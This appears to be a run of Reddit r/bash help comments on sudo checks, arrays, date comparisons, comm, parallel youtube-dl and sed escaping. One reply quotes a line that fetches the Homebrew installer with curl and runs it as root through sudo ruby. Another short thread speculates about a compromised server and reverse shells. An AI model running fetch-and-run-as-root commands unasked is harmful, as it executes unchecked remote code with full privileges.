&gt;Normally we have 2 sudo users like below. But as can you see , its returning sudo for user3 too. What might be problem? First confirm whether user3 can sudo. Examine the output of: sudo -l -U user3 That will tell you what user3 can do w.r.t. sudo. If it says that user3 is *allowed* to sudo, then somewhere in your `/etc/sudoers` is the directive(s) that allow this. Pay special attention to lines that begin with `#include` or `#includedir`; the `#` is *part of the include directive*. You're quite wrong if you think it actually *prevents* the inclusion. If it says that user3 is *not allowed* to sudo, then there's a bug in your script. Run it in debug mode (`-x`) with "exit-on-first-error" (-e) to see where things went wrong: bash -ex &lt;your_script&gt; &gt;My other question is : When attempting to run on CentOS/RedHat OS then I am getting the following th error message Just I am running it on opensuse: passwd: bad argument -Sa: unknown option **HINT:** When you get this kind of error message, the **first** thing you should always do is `man &lt;command&gt;` to see what's supported and what's not on your system. I don't use any of CentOS/RHEL/OpenSuSE, but a quick search online for the [CentOS man page](https://www.unix.com/man-page/centos/1/passwd/) suggests that it's the `-a` ("all users") option that's not supported on your system. You'll just have to get your list of users some other way, then run `passwd -S &lt;user&gt;` on each username and parse the output per your original script. You might also want to check the output of `passwd -S` first, to see if the fields are what your script expects. After all, it's clearly _not_ the same program that I (and everyone else who said to `passwd -Sa`) expected, and having all your users marked as `disabled` is rather odd indeed. **Further Reading:** * `man passwd` * `man sudoers`
 zero=0
I finally got it working! Thank you so much. In the end, I just had to change \`curl -r\` to \`curl -X\` in your example.
I don't know why, but with this code the hash would never match. I tried everything I could think of (I assumed the issue was an extra/missing set of quotes somewhere) but after trying EVERYTHING I could think of i'd either get one of two errors: "hash doesn't match" or "not valid base64". I know it's better to use \`jq\` but I could never get it to play nice and ended up getting the following to work: DATA='{"message": "update", "content": '"$local\_file"', "sha": '"$github\_hash"'}' echo $DATA | curl -X PUT -u "$user:$token" https://api.github.com/repos/$user/$repo/contents/$file 
Odd. I don't see how that could possibly work, unless you've added literal quotes into your local_file and github_hash variables. If so, the jq example should work if you remove those.
I am looking for ways to improve this. I am not a bash expert by any means. So i am sure there are better ways I can do things. 
I think it's great that you make tools/functions that the rest of your team finds helpful. That's really valuable. And if this strategy works for you and your team, then I say that's great --- stick with it. But I must admit that the obvious thing to me is to just write a manpage for any command that you think needs documentation. I write manpages in markdown and convert them to troff format through pandoc (and in fact I added a section to my manpage format so that I could look up common examples that I found useful).
That might work. I am not very familiar with man pages. But this also provides a bit of type safety since you can't pass invalid values
It also has the side effect of not caring about the order of parameters since it looks for the names you specify. 
Do you have any good resources on how you setup your man pages?
First thing: You should be able to put all your code into one block by indenting each line with 4 spaces. It's a bit easier to read :) On to code. I'll admit I've not seen or used the `//,/` notation in array assignments before... but I don't think it's doing what you think it's supposed to do. Running similar code in my shell, I get the original string all assigned to only the first element. $ stuff="hi,bye;gday,gnight" $ arr=(${stuff//;/}) $ echo $arr hi,byegday,gnight $ echo ${arr[1]} $ echo ${arr[0]} hi,byegday,gnight So, when you get to `URL_REDIRECT_LIST=(${URL_ALIAS_LIST[@]//,/ })`, you're splitting a single string, not several strings, and that single string has 4 comma-separated fields. My feeling is that if you're trying to set up and use an array in bash, it's probably time to start writing Python :p . But, in the interest of learning some bash (something I need, also)... Looking at http://tldp.org/LDP/abs/html/string-manipulation.html, I think you should try the echo `expr match "$variable" '\(regex\)'` syntax. There's probably a newer way to write, judging by the use of backticks :p But, this yielded me $ echo `expr match "$stuff" '\(.*;\)'` hi,bye; which looks like it's in the direction you're trying to go with this script. 
 I'm going to comment and explain inline below: URL_ALIAS_LIST=(${URL_STRING//;/ }) echo ${URL_ALIAS_LIST[*]} This results in `${URL_ALIAS_LIST[0]}` set to `www.mainurl.com,mainredirect.com` and `${URL_ALIAS_LIST[1]}` set to `www.alias.com,aliasredirect.com` which is fine and what you expected. echo "----" for i in "${URL_ALIAS_LIST[@]}" do URL_REDIRECT_LIST=(${URL_ALIAS_LIST[@]//,/ }) done Here, `${URL_ALIAS_LIST[@]` is `www.mainurl.com,mainredirect.com www.alias.com,aliasredirect.com` so when you parse it with the line `URL_REDIRECT_LIST=(${URL_ALIAS_LIST[@]//,/ })` that results in `${URL_REDIRECT_LIST[@]}` set to `www.mainurl.com mainredirect.com www.alias.com aliasredirect.com`. In fact you loop through twice and set it twice to the same value. I think maybe what you were trying to do instead was `URL_REDIRECT_LIST=(${i//,/ })` but that still won't work because once it runs through the second time, `URL_REDIRECT_LIST` will always be set to the second iteration of `i`. What you need is to bring in the following `j` loop into this loop. for j in "${URL_REDIRECT_LIST[@]}" do echo $j done At this point, `${URL_REDIRECT_LIST[@]}` has the string `www.mainurl.com mainredirect.com www.alias.com aliasredirect.com` so when you iterate through it, you are going to get all 4 echoed out. echo "----" for i in "${URL_ALIAS_LIST[@]}" do URL_REDIRECT_LIST=(${URL_ALIAS_LIST[@]//,/ }) for j in "${URL_REDIRECT_LIST[@]}" do echo $j done done In this last part, again you have two imbedded loops but just like above, you walk through the whole list twice. I think what you are looking for is something like this: for i in "${URL_ALIAS_LIST[@]}" do echo "----" URL_REDIRECT_LIST=(${i//,/ }) for j in "${URL_REDIRECT_LIST[@]}" do echo $j done done 
Your first code chunk doesn't tell you whether `URL_ALIAS_LIST` contains two strings (`www.mainurl.com,mainredirect.com` and `www.alias.com,aliasredirect.com`) or one string with a space in the middle (`www.mainurl.com,mainredirect.com www.alias.com,aliasredirect.com`). Change it to: for i in "${URL_ALIAS_LIST[@]}"; do echo $i done to be sure, and read the **Arrays** section of the bash man page to understand the difference between `${ARR[*]}` and `${ARR[@]}`. (**HINT:** The *only* difference is between `"${ARR[*]}"` and `"${ARR[@]}"`, but that's *critical* for dealing with array elements.) Moving on to the second chunk: for i in "${URL_ALIAS_LIST[@]}"; do URL_REDIRECT_LIST=(${URL_ALIAS_LIST[@]//,/ }) done for j in "${URL_REDIRECT_LIST[@]}"; do echo $j done Why are you looping over `"${URL_ALIAS_LIST[@]}"` without ever using the contents of the loop variable `i`? It's exactly equivalent to the rather silly: for i in 1 2; do URL_REDIRECT_LIST=(${URL_ALIAS_LIST[@]//,/ }) done and your second chunk is therefore effectively: URL_REDIRECT_LIST=(${URL_ALIAS_LIST[@]//,/ }) for j in "${URL_REDIRECT_LIST[@]}"; do echo $j done You have a similar problem in the third chunk (rewritten for silliness): for i in foo bar; do URL_REDIRECT_LIST=(${URL_ALIAS_LIST[@]//,/ }) for j in "${URL_REDIRECT_LIST[@]}"; do echo $j done done This time, you're doing the entire second chunk **twice**. **NOTE:** A `for` loop that iterates over a list *but doesn't use its loop variable* is almost always a code smell. It might just be that you want to loop as many times as there are elements in that list, but it's usually an *HUGE* bug.
I tore apart your code in a separate comment, so here's how to fix it, assuming the following: * you're trying to create a generic _lookup table_, so that you can associate `www.mainurl.com` with `mainredirect.com` * the lookup table is initialized dynamically from a configuration string of the form `key1,val1;key2,val2;...` * none of the keys and values have embedded spaces In bash, I'd definitely be using an _associative array_: ``` URL_STRING="www.mainurl.com,mainredirect.com;www.alias.com,aliasredirect.com;www.google.com,duckduckgo.com" declare -A URL_REDIRECTS for SPEC in ${URL_STRING//;/ }; do # Split $SPEC on the comma KEY=${SPEC%,*} VAL=${SPEC#*,} URL_REDIRECTS[${KEY}]=${VAL} done # Check to make sure we've set URL_REDIRECTS correctly for KEY in "${!URL_REDIRECTS[@]}"; do echo "${KEY} -&gt; ${URL_REDIRECTS[${KEY}]}" done # And a usage example echo "Let's redirect www.alias.com to ${URL_REDIRECTS[www.alias.com]}" ``` Read the **Arrays** section of the [bash man page](http://man7.org/linux/man-pages/man1/bash.1.html) to understand what `"${!arr[@]}"` does.
&gt; Running similar code in my shell, I get the original string all assigned to only the first element. That's because you're missing a space in your string substitution. I think you actually meant to write: ``` arr=(${stuff//;/ }) ``` 
 #!/bin/zsh I think you want the r/zsh reddit, they're just down the hall, third door on the left. :)
wow how did i not know of this 
agh, good catch! derp
Sorta kinda, though: ``` echo "[-] Dependencies needed: $DID_NOT_FIND\n" ``` bash's `echo` doesn't interpret escape sequences like `\n` without a `-e` option. Anyway, I don't use `ksh` (though I won't say no to a good quiche), but it's similar enough that I'll comment on some oddities: ``` case "$USER_SELECTED_INSTALL" in Y | YES | y | yes) install_deps break ;; N | NO | n | no) exit ;; *) exit esac ``` can be collapsed without altering its logic to: ``` case "$USER_SELECTED_INSTALL" in Y | YES | y | yes) install_deps ;; *) exit 1 esac ``` The `break` is superfluous and, since the "no" branch does exactly the same thing as the default branch, that can go away too. Also, since the script didn't achieve its stated goal, you really should exit with a non-zero status. (There are several other `exit`s that should be similarly treated.) If it were in bash, it could be further reduced to: ``` case "${USER_SELECTED_INSTALL,,}" in y | yes) install_deps ;; *) exit 1 esac ``` Later, we have: ``` if [ "$UID" != '501' ] then echo "[-] Must be root or admin to install Homebrew" exit else sudo /usr/bin/ruby -e "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/master/install)" fi ``` Because both `sudo`'s configuration and your UID permission mappings can change over time, and even a successful `sudo` can be undone by a failed command run, you might as well just run the `sudo` and test for success: ``` if ! sudo /usr/bin/ruby -e "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/master/install)" then echo "[-] Brew install failed, please check configuration" exit 2 fi ``` Do the same for `brew install flif`. 
Thank you! the break and extra nos were complete brain failures but I didn't know about the UID changing.
&gt; I didn't know about the UID changing Strictly speaking, your UID won't change after account creation, but the UID that macOS assigns to the first created user may not always be 501. I remember a time long ago when the Linux distro I used suddenly changed their lower-bound UID assignment from 501 to 1000, and got a nasty surprise when I tried to access my server's NFS directories from a new box. That said, if you really want to test for "must be root or admin", then test for _literally_ that: ``` if [[ $(id -un) == root || $(id -Gn) == *admin* ]] ```
&gt; does it take into account that i want to look at 17.30pm today and not yesterday? You've hit upon the nub of the problem: You can't reasonably compare times without first establishing the days (relative or absolute) to which the times refer. To ensure you always get the right answer, use `date` to convert all _properly-qualified_ time references to _Unix epoch time_ (i.e. seconds since Jan 1 1970 00:00 UTC), then you can do simple numerical comparisons: ``` currentsecs=$(date +%s) if [[ $currentsecs -gt $(date -d "04:30 today" +%s) || $currentsecs -lt $(date -d "17:30 today" +%s) ]]; then echo yes else echo no fi ```
First of all, the conditional should be `&amp;&amp;` instead of `||`. You are actually doing an ascii string compare which will work if the format is fixed and controlled but may fail in some cases. The better way is to use epoch time which is absolute and can span day boundaries. starttime=$(date -d "04:00 today" +%s) endtime=$(date -d "17:30 today" +%s) currenttime=$(date +%s) if [[ "$currenttime" -gt "$starttime" ]] &amp;&amp; [[ "$currenttime" -lt "$endtime" ]]; then echo yes else echo no fi You actually don't need to put the word "today" in the timespec but I added it for clarity. The fun thing about this is if you want to check a time to see if it's between 8pm yesterday and 1am tomorrow you can easily specify that and the compare will work. In fact the you can plug any start and any end datespec in and it will work. 
Thanks, I do have another time based compare that uses the difference in seconds to compare each other but it's only checking several minutes between each other and not hours like the one.
The variable $currenttime is only going to be evaluated once during the script. Turn it into a function so it is executed each time it is called.
Thanks, This seems to work best with changing the today to yesterday/tomorrow as well where needed as some of the times i'm checking are before / after middnight, so i've added another check before hand using the same check to see if it's between middnight and midday and then set today/tomorrow/yesterday as a variable where needed. &amp;#x200B; Needs a bit of testing and tweeking where needed but it seems to work so far. &amp;#x200B; Thanks again
Not a direct answer to your question, but you might check out using a unix timestamp. It's just a running count of seconds, so it would be easy to calculate. You can convert to and from with the "date" command. https://en.m.wikipedia.org/wiki/Unix_time?wprov=sfla1 
Hi, &amp;#x200B; As you said " You'll just have to get your list of users some other way, then run passwd -S &lt;user&gt; on each username and parse the output per your original script. " &amp;#x200B; How can I do that ?
Thanks man. As you said , I have checked my users. No any issue. So they don't have sudo rights. After I am gooling , sudo -l -U didn't work on my RedHat OS. I need alternative way to catch users with sudo rights. I assuming I need to check /etc/sudoers file. How can I do that ? 
This thread is bonkers. I love it. maarten(){ while (($#)); do case $1 in --url* ) export STRING=$2; shift 2 ;; * ) declare -A deblock IFS=';'; for pair in $STRING; do IFS=',' read i j &lt;&lt;&lt;"$pair" deblock[$i]="$j";deblock[$j]="$i" done; unset IFS echo ${deblock[$1]:-"Nope."} shift ;; esac;done } Command: (note space instead of equals) `maarten --url-string "mitchell,webb;calvin,hobbes;mike,jay"` STRING is now in the env: `maarten mike` now returns `jay` and vice-versa. 
Why not: `wget -c` &gt;\-c &gt; &gt;\--continue &gt; &gt;Continue getting a partially-downloaded file. This is useful when you want to finish up a download started by a previous instance of Wget, or by another program.
I think the list has old links in it, not that they did not complete. But I can try it. &amp;#x200B;
I think you're looking at it backwards. make a list of files you wanted to download and use a loop (while or foreach) to iterate over that list if the current file exists, yay if not download it You \_could\_ come up with something that uses grep, but it's not really what you need in this case. 
I think you should say its written for mac not linux
Before the youtube-dl command you can count the active youtube-dl processes for example like `ps -aux|grep youtube-dl|grep -v grep|wc -l` if that is less than the amount you want in parallel (is 5 or 10?) then launch the next youtube-dl instance in another thread, else wait. Something like this should work (instead of your 15, 16, 17 lines): while [ $(ps -aux|grep youtube-dl|grep -v grep|wc -l) -ge 5 ]; do sleep 5 done youtube-dl &lt;your options&gt; &amp; 
 function nameOfFunction() { doSomethingWith $1 } export -f nameOfFunction cat listOfStuff | parallel -j 8 nameOfFunction {}
 man comm
Just posting to see the answer.
I do want the answer, have i broken a rule?
No, thats not what I want to do. I want to compare a list of files with a directory of files. 
 &lt;(find /some/dir/with/files -maxdepth 1 -type f -name "*.txt" | sort) Now it's a sorted list of files ending with ".txt" from /some/dir/with/files
My guess is some DNS cache poisoning took place to make google.com and kernel.org point to attacker controlled machines. These machines would have then hosted the scripts in question. This might be done in an attempt to stay stealthy as google.com would most likely be a trusted domain, it also does not use https, so no certificate would be required. As for what exactly happens after that point I'm not completely sure, the formatting isn't exactly easy to read. Maybe I will have a closer look later today
I appreciate your analysis! Really helpful, thanks!
&gt;there were issues converting the file generated by `youtube-dl --download-archive FILE` into a list of usable URLS for failed downloads `--download-archive FILE` generates a list of *successful* downloads. No one can generate a list of failed downloads from that file alone; you need to use that file to generate the URLs of all successful downloads, then use the `comm` utility to compare it against the full (original) download list to get just the ones which failed. **TIP 1:** Stop trying to use regexes to extract URLs; your method will fail if there are multiple URLs on a single line, for instance, or might also extract non-video links. Instead, use a proper command-line HTML parser like [pup](https://github.com/EricChiang/pup), and formulate a selector to precisely target the links you want. **TIP 2:** Stop deleting `successful_downloads.txt` on each `youtube-dl` run. Let it serve as a DB of what's been downloaded so far, so that you can compare it against a full download list to see what's left to do. To a first approximation, your script should probably look something like this \[**WARNING**: untested\]: #!/bin/bash # Use pup to grab all YouTube links pup -p 'a[href*="youtube"] attr{href}' &lt;&lt;&lt;"$1" | sort &gt; main.lst # We start with the full list cp main.lst work.lst # Do we still have work to do? while [ -s work.lst ]; do # Launch 10 DL processes with 5 URLs each xargs -P 10 -n 5 youtube-dl --download-archive=successful_downloads.txt &lt; work.lst # Determine what's left over... comm -1 main.lst &lt;(download_archive_to_urls &lt; successful_downloads.txt | sort) &gt; work.lst done # Clean up rm successful_downloads.txt The `successful_downloads_to_urls` script/function is left as an exercise to the reader. It simply takes in the contents of a `--download-archive` file from STDIN, and converts each line into a URL to be printed to STDOUT. For instance, a downloaded YouTube video would be recorded as: youtube &lt;video_ID&gt; so converting that into a URL is simply: sed -e 's@^youtube \(.*\)$@https://www.youtube.com/watch?v=\1@' Also, a minor caveat: You have 10 `youtube-dl` processes writing to one download archive, which ordinarily gives me the heebie-jeebies. However, the likelihood of one process stomping over the output of another is very small, unless you're downloading a lot of small videos over a gigabit link. In any case, you're simply risking the possibility of re-downloading a couple of videos, which `youtube-dl` should avoid quite easily, when it sees the video already in the directory. But if it bothers you, simply reduce the `-P` factor and up the `-n` count to `xargs`. **Further Reading:** * [`comm` man page](http://man7.org/linux/man-pages/man1/comm.1.html)
I think u/PolleV is on the right track, and that your server is probably querying a poisoned DNS resolver. The lower lines also look like a classic series of system-info-gathering commands. However, the script you posted will block on `vi Administrator.sh`, unless `vi` itself has also been replaced by something that's not, well, your standard `vi` editor. Is this the full unexpurgated script, or did you censor/trim stuff?
I was going thought the list of my 'servers' that we're offline and found this one that still was responding to HTTP requests. There was a web app running called "shell" that just returned this bash dump, no trimming. I believe the server also had another exploit and replaced mine, then for some reason, executed this?
Assuming all your LFS download tarballs are in `~/Downloads/`, and your download URL list is in `~/Downloads/dl.lst`, then it's simply a matter of: cd ~/Downloads comm -1 &lt;(sed 's@^.*/\([^/]*\)$@\1@' dl.lst | sort) &lt;(\ls *.tar.*) That weird second argument to `comm` takes the contents of `dl.lst`, strips off everything up to the last `/` on each line (leaving the filename), then sorts the lot and passes it via process substitution. The third argument to `comm` just process-substitutes the list of downloaded tarballs, presorted by bash's wildcard expansion of `*.tar.*`. Then `-1` tells `comm` to output the filenames in the LHS substitution (the full list) that aren't in the RHS (the downloaded list), *et voilà*! **Further Reading:** * [`bash` man page](http://man7.org/linux/man-pages/man1/bash.1.html), **Process Substitution** section * [`comm` man page](http://man7.org/linux/man-pages/man1/comm.1.html)
I have updated my comment with an explanation for each of them
I don't believe we are looking at a script. This seems to me like it is an interactive shell
This is really good!! Thank you, your explanation is really easy to understand and with the small amount of information provided, you seemed to crack it 😄
Actually, I just realized that it's almost certainly a _shell history file_. It's exactly the kind of content you'd find in, say, `~/.bash_history`.
Ahh Thanks! I used the awk -F/ '{print $NF}' to do the same thing as the sed bit, seems to work well enough. 
Actually, I just realized that it's almost certainly a _shell history file_. It's exactly what you'd expect to find in, say, `~/.bash_history`.
Implicit "I'm". I do that all the time, omit "I" from the beginning of a sentence. 
Sorry for the confusion. I mean: I'm sorry for the confusion.
Mmm, OP said this was the dump of a _running_ web app called "shell". So to me it seems like this was probably a reverse shell connection. 
Yeah, for some reason (user error) the first time i looked at the comm Man page, I thought it compared two files. My bad. 
For reasons that im not 100% sure about, it only works with the -3 (missing from one or the other.) you would think that if -3 works, then -1 or -2 would, but both just return the full list. &amp;#x200B;
Everything is a file ;)
Hi again, &amp;#x200B; I have tested it onRHEL 6.1. its working very well. &amp;#x200B; # sudo -l -U "user1" | grep -q not\ allowed &amp;&amp; CAN_SUDO # echo $CAN_SUDO # sudo -l -U "user2" | grep -q not\ allowed &amp;&amp; CAN_SUDO # echo $CAN_SUDO sudo sudo -l -U user1 User user1 is not allowed to run sudo on hostname. &amp;#x200B; But its not working on newer OS versions such as RHEL 7. I assuming I need to catch sudo users from sudoers file. How can I modify script ? &amp;#x200B; Thanks again,
I have my own setup that I haven't written about online anywhere. [Perhaps I should sometime]. But after a quick look around, I think you could get pretty far with [this guide on using pandoc to make manpages](http://www.eddieantonio.ca/blog/2015/12/18/authoring-manpages-in-markdown-with-pandoc/).
Yeah, my apologies I'll add that. There are actually so many things upon reviewing that made me go, "Oh I should have just...". Rough day haha
Have you tried Googling “iterate through string in bash” and also “how to format code on reddit”? Both should take less than 5 minutes combined. Cheers.
Is this bash specific or would it work over /bin/sh as well?
First of all, can you please edit your post and put 4 spaces in front of each line of code. I don't know if some of the problems I'm seeing are due to formatting or actually in your script. That said, this script has numerous problems. I'm surprised your professor wasn't able to point any of them out. Do you get any errors when you run the script? Try adding `set +x` to the top of the script to get line by line evaluated debugging output. I don't know what "$1" is supposed to look like but based on your description, your `for ...` statement will probably not do what you want. Also, your comparison expression are incorrect I think.
no worries, just thought I would mention it.
&gt; What makes this progress bar different from the basic terminal progress bars which use carriage return (\r) to overwrite their own line, is that this progress bar does not interfere with the normal output of your script. Did you read the man page for `pv` before you gave up on it? &gt; -c, --cursor &gt; Use cursor positioning escape sequences instead of just using carriage returns. https://www.ivarch.com/programs/quickref/pv.shtml
&gt; sudo -l -U didn't work on my RedHat OS Can you provide an example of how this isn't working?
Hey, thanks for the feedback. I am by no means an expert, but if I understand pv correctly, it is completely unrelated to what I am doing here? pv is used for showing progress when piping data, that is completely unrelated to what I am doing here, this is a general purpose bar that can be used to show progress in for example a script that takes many different actions and still wants to present a progress indicator. Please feel free to educate me if I am wrong, but it seems to be a completely different matter. Let's say for example that you create a script that uses sed and awk to update 10000 files. and you would like to show the progress of that operation. pv would not even know what kind of actions your script is taking nor how far it is to completion? This progress bar is useful when you know how to determine the completion % of your script.
afaik it is not bash specific, however it will depend on the terminal capabilities offered by the terminal you use. (ie, does it have color support, does it support scroll areas, ect)
Your using slash `/` as a separator. Therefore you need to escape the slash in the text s/GameDBPWD="legend"/GameDB="UyTRH&amp;^\/\|()^"/
thank you I edited the post.
You have a delimiter `/` in your replacement pattern; sed doesn't know what to do with `\|()^"/`. Also, `&amp;` means "the whole regex match" when it's used in the replacement. Two ways to solve this off the top of my head: Pick a better delimiter (and escape the `&amp;`): sed -i 's,GameDBPWD="legend",GameDB="UyTRH\&amp;^/\|()^",' config.txt # must escape ampersand ^^ Use `c` (change) instead of `s` (substitute) sed -i '/GameDBPWD="legend"/c\GameDB="UyTRH%^/\|()^"' config.txt # ^address ^change (whole line)
Awesome thanks!
thank you c (change) is new to me. I will try it out .:) since c (change) whole line. do I need to escape &amp; anymore? GameDB="UyTRH&amp;^/\|()^"
No, just the backslash. `&amp;` is an `s` construct.
Good stuff. as for shopt, here is an invaluable one: shopt -s nullglob for i in /tmp/thisfiledoesnotexist* do echo $i done Mostly for this kind of thing, you don't want the for loop to do anything. But it will unless you set nullglob. Missing from article: [[ ]] There are a bunch of neat new tricks under the hood when you enclose your tests with [[ ]] One that interests me the most is =~ if [[ "foobar" =~ "foo" ]] ; then echo "Wow, almost like perl !!" fi 
I think I might have made a typo. it should be: from: GameDBPWD="legend" to GameDBPWD="UyTRH&amp;^/\|()^" GameDBPWD="" remains unchanged, just the value inside "" changes. would you recommend using the c (change) as well? &amp;#x200B; 
How is your data structured? What kind of encryption is that?
&gt;\--download-archive FILE generates a list of successful downloads. No one can generate a list of failed downloads from that file alone Sorry, I should have mentioned that I'm removing matches made between input URLs and successful downloads so that I'm left with a list of URLs for failed downloads. I think my issue with comm was that I couldn't figure out how to make it work with regex--I'm using regex because a) I have urls from multiple video sites and b) the successful downloads file doesn't output a proper list of urls that can be compared against my initial URL list: examples of --download-archive output versus the URLs I input successful download = sitename 23412313 initial input url = sitename.com/blahblah/23412313 Btw, I have to head out the door, but I don't see any other references to \`successful\_downloads\_to\_urls\` anywhere else in your comment. I did notice \`sed -e 's@\^youtube \\(.\*\\)$@[https://www.youtube.com/watch?v=\\1@'\`](https://www.youtube.com/watch?v=\1@'`) but I'll need to take time later tonight to parse and understand it. Thanks for the help btw! &amp;#x200B;
yep, this is good. thanks. 
Is there a reason to push that into background? By pushing it into background and then doing an exit, you are creating a zombie. You should take out the `&amp;` and just have your script wait for the child to finish.
I assume that your script extends beyond what you posted, and that you're `exit`ing the script early if a firmware upgrade is required. That said: ``` echo $FWUPGRADECMD | $SSHCMD &amp; ``` `ssh` can take a command to run on the remote host, so this is better written as: ``` $SSHCMD $FWUPGRADECMD &amp; ``` There's also the issue of dealing with `ssh`'s STDIN, STDOUT and STDERR, plus the fact that bash will send a SIGHUP to it when your script finishes executing, potentially causing your firmware upgrade to fail halfway and brick your device. To deal with all that: ``` nohup $SSHCMD $FWUPGRADECMD &lt;/dev/null &gt;/tmp/fwupgrade.log 2&gt;&amp;1 &amp; ``` **Further Reading:** * `man ssh` * `man nohup`
I'd listen to the suggestions from /u/ralfwolf and /u/anthropoid. Backgrounding the task mid-script like that is generally bad practice. That aside, to answer your question more directly, there's a `timeout` command that's present by default on most distros. $ date; timeout 3s sleep 60; date Tue Dec 11 16:46:31 PST 2018 Tue Dec 11 16:46:34 PST 2018 $ From `man timeout`: &gt; timeout - run a command with a time limit &gt; &gt; SYNOPSIS &gt; timeout [OPTION] DURATION COMMAND [ARG]... &gt; timeout [OPTION] &gt; &gt; DESCRIPTION &gt; Start COMMAND, and kill it if still running after DURATION.
&gt;`shopt -s nullglob` I'm one of the few folks who explicitly *disables* `nullglob`, because: 1. It's not cross-Bourne-shell, so I prefer the portable: &amp;#8203; for i in /tmp/thisfiledoesnotexist*; do [ -f "$i" ] || continue ... done 2. There are times when I actually want to know that the glob is failing: for i in data.processing.output.*; do [ -f "$i" ] || { echo "ALERT! ALERT! No $i !!!" ; break; } ... done
&gt;`sudo -l -U "user1" | grep -q not\ allowed &amp;&amp; CAN_SUDO` That's not what my original code says: ``` sudo -l -U "user1" | grep -q not\ allowed &amp;&amp; CAN_SUDO="" || CAN_SUDO=sudo ``` i.e. if the `grep` succeeds, then `user1` **can't** sudo.
I did have it that way originally, but it seemed like the entire script was locking up or timing out. Even after the firmware updated and the remote device rebooted both the script and command were still running.
Your assumption is correct. I will try again, but last time I did the SSH first the command wouldn't function so I switched to the echo workaround. I thought maybe it had something to do with the remote device having its own custom CLI structure. The firmware is being retrieved from a 3rd device, so literally once that command is issued the entire script can be terminated.
Interesting, thank you for the info!
Sorry for typo my fault. I have edited my answer again. 
 I have tested it on RHEL 6.1. its working very well. It works as expected on my system . &amp;#x200B; # sudo -l -U "user1" | grep -q not\ allowed &amp;&amp; CAN_SUDO="" || CAN_SUDO="sudo" # echo $CAN_SUDO # sudo -l -U "user2" | grep -q not\ allowed &amp;&amp; CAN_SUDO="" || CAN_SUDO="sudo" # echo $CAN_SUDO sudo sudo -l -U user1 User user1 is not allowed to run sudo on hostname. &amp;#x200B; But its not working RHEL 7.5. As you can see , user1 has not sudo rights. But its returning as sudo user. # sudo -l -U "user1" | grep -q not\ allowed &amp;&amp; CAN_SUDO="" || CAN_SUDO="sudo" # echo $CAN_SUDO sudo # sudo -l -U "user2" | grep -q not\ allowed &amp;&amp; CAN_SUDO="" || CAN_SUDO="sudo" # echo $CAN_SUDO sudo then , I am running like below. I have looked output of sudo -l -U "user1". its returning different than output of RHEL6. &amp;#x200B; user1 output (not sudo user): Matching Defaults entries for bserp on hostname1: requiretty, !visiblepw, always_set_home, env_reset, env_keep="COLORS DISPLAY HOSTNAME HISTSIZE INPUTRC KDEDIR LS_COLORS", env_keep+="MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE", env_keep+="LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES", env_keep+="LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE", env_keep+="LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY", secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin User user1 may run the following commands on hostname1: (root) !/*/sudo, !/*/sudo*, !/*/*/sudo, !/*/*/sudo*, !/*/*/*/sudo, !/*/*/*/sudo* user2 output (sudo user) &amp;#x200B; Matching Defaults entries for bserp on hostname1: requiretty, !visiblepw, always_set_home, env_reset, env_keep="COLORS DISPLAY HOSTNAME HISTSIZE INPUTRC KDEDIR LS_COLORS", env_keep+="MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE", env_keep+="LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES", env_keep+="LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE", env_keep+="LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY", secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin User user2 may run the following commands on hostname1: (ALL) NOPASSWD: ALL --&gt;&gt;&gt;&gt; This line returning (root) !/*/sudo, !/*/sudo*, !/*/*/sudo, !/*/*/sudo*, !/*/*/*/sudo, !/*/*/*/sudo* &amp;#x200B;
You could test $i after the for loop I guess.
Your ssh invocation may have hung up on STDIN. That's why mine redirects it from /dev/null. In general, you should do explicit redirections of all standard file descriptors for background commands. 
&gt;comm -1 main.lst &lt;(download\_archive\_to\_urls &lt; successful\_downloads.txt | sort) &gt; work.lst is `download_archive_to_urls` a text file? also is `&lt;(download_archive_to_urls &lt; successful_downloads.txt | sort)` passing whatever result this is to `main.lst`?
Discussed [here](https://www.reddit.com/r/commandline/comments/9nke4e/eleven_bash_tips_you_might_want_to_know/) and reviewed not very favourably. Here's [my list of complaints](https://www.reddit.com/r/commandline/comments/9nke4e/eleven_bash_tips_you_might_want_to_know/e7ogabk/).
A couple of asides: `sudo -l -U "user1" | grep -q not\ allowed &amp;&amp; CAN_SUDO="" || CAN_SUDO="sudo"` A &amp;&amp; B || C is an attempt to make a terse form of `if`-`then`-`else` , but it has problems that you need to be aware of: https://github.com/koalaman/shellcheck/wiki/SC2015 You should probably put this test into a function instead, something like: canSudo() { if sudo -l -U "${1:?No username supplied}" | grep -q "may run"; then printf '%s\n' "sudo" fi } In your example outputs, you left the username: Matching Defaults entries for bserp on hostname1: Matching Defaults entries for bserp on hostname1: If the test is the same, then the output should - unsurprisingly - be the same. Can you try again with different users?
This makes youtube-dl download multiple videos, but it prevents me from making a list of URLs for downloads that fail. Here's an example to explain why. If I scrape two videos (video\_one and video\_two), and then run them in parallel, video\_two might finish first and execute `--download-archive successful_downloads.txt`. This is an issue because I'm looking for mismatches between the videos I scraped and successful\_downloads.txt to generate a URL list of failed downloads. I can't use sort to align the scraped videos to `successful_downloads.txt` because the text in each file is different and already requires regex as it is to compare them.
It's important that successful\_downloads.txt which is created from `youtube-dl --download-archive successful_downloads.txt ...` is ordered the same as the order the URLS were scraped in though, otherwise I can't compared scraped URLS to `successful_downloads.txt` to generate a list of failed video URLs for manual review later on. I haven't been able to use something simple like `sort` to get the order right because `--download-archive successful_downloads.txt` doesn't output full video urls, so it would still be out of order compared to the scraped URLs. Here's an example: Scraped URLs: [youtube.com/blahblah/23412313](https://youtube.com/blahblah/23412313) [imgur.com/lololol/999999](https://imgur.com/lololol/999999) output from `--download-archive` imgur 999999 youtube 23412313
